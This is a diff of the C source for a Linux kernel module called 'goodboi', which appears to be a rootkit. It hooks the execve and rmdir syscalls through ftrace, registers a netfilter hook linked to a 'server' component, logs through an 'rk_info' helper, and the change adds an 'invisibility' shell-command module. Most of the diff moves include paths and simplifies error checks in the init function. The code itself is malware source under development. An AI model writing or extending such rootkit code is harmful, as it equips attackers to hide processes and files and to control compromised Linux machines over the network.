@@ -5,18 +5,19 @@
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
 
-#include "inc/ftrace/ftrace_helper.h"
-#include "inc/logger/logger.h"
+#include "utils/ftrace/ftrace_helper.h"
+#include "logger/logger.h"
 
 // ////////////////////////////////////////////////////////////////////
 
 #include "inc/hooks/syscall/execve/execve.h"
 // #include "inc/hooks/syscall/getdents64/getdents64.h"
 #include "inc/hooks/syscall/rmdir/rmdir.h"
+#include "inc/hooks/netfilter/server/server.h"
 
 // ////////////////////////////////////////////////////////////////////
 
-#include "inc/hooks/netfilter/server/server.h"
+#include "inc/shell/commands/invisibility/invisibility.h"
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
@@ -24,11 +25,6 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Aspheric_");
 MODULE_DESCRIPTION("What a goodboi");
-
-// ////////////////////////////////////////////////////////////////////
-// ////////////////////////////////////////////////////////////////////
-
-int err;
 
 // ////////////////////////////////////////////////////////////////////
 // ////////////////////////////////////////////////////////////////////
@@ -54,10 +50,10 @@ static struct nf_hook_ops nfho = {
 static int __init goodboi_init(void) {
     rk_info("[goodboi_init] loading goodboi module...\n");
 
-    if ((err = fh_install_hooks(dir_hooks, ARRAY_SIZE(dir_hooks))))
+    if (fh_install_hooks(dir_hooks, ARRAY_SIZE(dir_hooks)) < 0)
         rk_info("[goodboi_init] failed to install hooks\n");
 
-    if ((err = nf_register_net_hook(&init_net, &nfho)) < 0) {
+    if (nf_register_net_hook(&init_net, &nfho) < 0) {
         rk_info("[goodboi_init] failed to install netfilter hook\n");
     }
 
